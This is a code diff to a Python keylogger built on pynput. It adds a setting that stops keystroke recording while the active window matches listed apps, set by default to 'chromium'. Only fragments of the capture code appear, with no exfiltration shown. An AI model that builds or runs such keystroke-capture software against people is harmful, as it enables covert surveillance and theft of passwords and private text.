@@ -37,7 +37,7 @@ from threading import (
 )
 from pathlib import Path
 from datetime import datetime
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 
 try:
     from pynput import keyboard
@@ -118,6 +118,7 @@ class KeyloggerConfig:
     enable_window_tracking: bool = True
     log_special_keys: bool = True
     window_check_interval: float = (WINDOW_CHECK_INTERVAL_SECS)
+    excluded_apps: list[str] = field(default_factory = list)
 
 
 @dataclass
@@ -535,6 +536,20 @@ class Keylogger:
 
         return "[UNKNOWN]", KeyType.UNKNOWN
 
+    def _is_excluded_window(self) -> bool:
+        """
+        Return True when the current active window matches an excluded app.
+        """
+        if not self.config.excluded_apps or not self._current_window:
+            return False
+
+        window_title = self._current_window.lower()
+
+        return any(
+            excluded_app.lower() in window_title
+            for excluded_app in self.config.excluded_apps
+        )
+
     def _on_press(
         self,
         key: Key | KeyCode,
@@ -550,6 +565,9 @@ class Keylogger:
             return
 
         self._update_active_window()
+
+        if self._is_excluded_window():
+            return
 
         key_str, key_type = self._process_key(key)
 
@@ -651,7 +669,10 @@ def main() -> None:
     """
     Entry point with default configuration
     """
-    keylogger = Keylogger(KeyloggerConfig())
+    config = KeyloggerConfig(
+        excluded_apps = ["chromium"]
+    )
+    keylogger = Keylogger(config)
 
     try:
         keylogger.start()
